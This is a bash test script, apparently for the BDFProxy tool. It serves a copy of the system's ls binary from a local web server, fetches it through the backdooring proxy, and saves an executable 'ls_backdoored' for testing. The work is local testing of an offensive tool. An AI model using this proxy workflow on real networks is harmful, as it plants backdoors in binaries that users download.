#!/usr/bin/env bash

# This script configures a simple local python webserver
# and downloads $(which ls) from it through BDF proxy.

#
# IMPORTANT: set transparentProxy = False before running this test
#

# figure out python executable (especially relevant on arch linux)
if [ $(which python2.7) ]
then
  PYTHON=python2.7
elif [$(which python2) ]
then
  PYTHON=python2
else
  PYTHON=python
fi

# start up the server
echo "[*] Starting up a webserver to serve /tmp"
cd /tmp
$PYTHON -m SimpleHTTPServer 9001 &
SERVER_PID=$!
cd -

# start the proxy
echo "[*] Starting"
$PYTHON ./bdf_proxy.py &
sleep 5
PROXY_PID=$!

# try to backdoor ls
echo "[*] Copying "$(which ls)" to /tmp"
cp $(which ls) /tmp
curl 'http://localhost:9001/ls' --proxy1.0 localhost:8080 > ls_backdoored
rm -f /tmp/ls
chmod +x ls_backdoored

echo "[*] Shutting down"

# shut down the services
kill $SERVER_PID
kill $PROXY_PID

echo "[*] ls_backdoored is available for testing in" $(pwd)
